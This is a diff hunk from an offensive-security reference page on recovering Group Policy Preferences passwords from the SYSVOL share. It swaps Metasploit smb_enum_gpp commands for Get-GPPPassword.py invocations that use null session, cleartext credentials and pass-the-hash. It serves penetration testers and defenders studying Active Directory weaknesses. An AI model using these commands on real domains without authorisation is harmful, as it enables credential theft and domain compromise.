@@ -10,30 +10,28 @@ Windows systems come with a built-in Administrator \(with an RID of 500\) that m
 
 * **Issue 1** : the password is set to be the same for every \(set of\) machine\(s\) the Group Policy applies to. If the attacker finds the admin's hash or password, he can gain administrative access to all \(or set of\) machines.
 * **Issue 2** : by default, knowing the built-in Administrator's hash \(RID 500\) allows for powerful [Pass-the-Hash](../../abusing-lm-and-ntlm/pass-the-hash.md) attacks \([read more](../../abusing-lm-and-ntlm/pass-the-hash.md#limitations-tips-and-tricks)\).
-* **Issue 3** : all Group Policy are stored in the Domain Controllers' SYSVOL share. All domain users have read access to it. This means all domain users can read the encrypted password set in Group Policy Preferences, and since Microsoft published the encryption key around 2012, the password can be decrypted🤷♂.
+* **Issue 3** : all Group Policy are stored in the Domain Controllers' `SYSVOL` share. All domain users have read access to it. This means all domain users can read the encrypted password set in Group Policy Preferences, and since Microsoft published the encryption key around 2012, the password can be decrypted🤷♂.
 
 ## Practice
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, the Domain Controllers' SYSVOL share can be mounted and recursively grepped.
-
-{% hint style="info" %}
-The following operations require mounting the SYSVOL share, it can't be done through a docker environment unless it's run with `privileged` rights.
-{% endhint %}
-
-The Metasploit Framework can automatically mount the share, look for the `cpassword` string and decrypt every match.
+From UNIX-like systems, the [Get-GPPPassword](https://github.com/ShutdownRepo/Get-GPPPassword) \(Python\) script can be used to remotely parse `.xml` files and loot for passwords.
 
 ```bash
-use auxiliary/scanner/smb/smb_enum_gpp
-msf auxiliary(smb_enum_gpp) > set RHOSTS $DOMAIN_CONTROLLER
-msf auxiliary(smb_enum_gpp) > set SMBDomain $DOMAIN
-msf auxiliary(smb_enum_gpp) > set SMBUser $DOMAIN_USER
-msf auxiliary(smb_enum_gpp) > set SMBPass $DOMAIN_PASSWORD
-msf auxiliary(smb_enum_gpp) > run
+# with a NULL session
+Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
+
+# with cleartext credentials
+Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+
+# pass-the-hash
+Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
 ```
 
-This can also be done manually. Tools like [pypykatz](https://github.com/skelsec/pypykatz) \(Python\) and [gpp-decrypt](https://github.com/BustedSec/gpp-decrypt) \(Ruby\) can then be used to decrypt the matches.
+Alternatively, searching for passwords can be done manually \(or with Metasploit `smb_enum_gpp` module\), however it requires mounting the `SYSVOL` share, which can't be done through a docker environment unless it's run with privileged rights.
+
+Tools like [pypykatz](https://github.com/skelsec/pypykatz) \(Python\) and [gpp-decrypt](https://github.com/BustedSec/gpp-decrypt) \(Ruby\) can then be used to decrypt the matches.
 
 ```bash
 # create the target directory for the mount
